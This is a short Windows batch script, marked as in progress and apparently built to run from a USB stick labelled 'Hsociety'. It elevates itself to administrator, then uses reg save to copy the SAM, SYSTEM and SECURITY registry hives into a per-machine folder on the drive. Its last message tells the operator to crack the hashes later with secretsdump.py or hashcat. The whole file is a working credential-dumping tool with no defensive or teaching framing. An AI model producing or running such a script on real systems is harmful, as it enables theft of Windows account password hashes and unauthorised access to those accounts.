::in progress
@echo off
setlocal EnableDelayedExpansion
:: Check for admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Not running as administrator. Relaunching with admin rights...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Set USB label and folder
set "usbLabel=Hsociety"
set "mainFolder=HashDumps"

:: Find USB drive by label
for /f "tokens=1,2*" %%A in ('wmic logicaldisk get name^, volumename ^| findstr /I "%usbLabel%"') do (
    set "usbDrive=%%A"
)

if not defined usbDrive (
    echo [ERROR] USB with label '%usbLabel%' not found.
    pause
    exit /b
)

:: Get PC name and timestamp
for /f %%C in ('hostname') do set "pcName=%%C"
for /f %%D in ('wmic os get localdatetime ^| find "."') do set "datetime=%%D"
set "datetime=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2!_!datetime:~8,2!-!datetime:~10,2!-!datetime:~12,2!"

:: Create folder
set "outputDir=%usbDrive%\%mainFolder%\%pcName%_%datetime%"
mkdir "%outputDir%"

echo [+] Dumping SAM, SYSTEM, and SECURITY hives...
reg save HKLM\SAM "%outputDir%\SAM"
reg save HKLM\SYSTEM "%outputDir%\SYSTEM"
reg save HKLM\SECURITY "%outputDir%\SECURITY"

echo [!] Hashes saved. Crack later with secretsdump.py or hashcat.
pause
exit
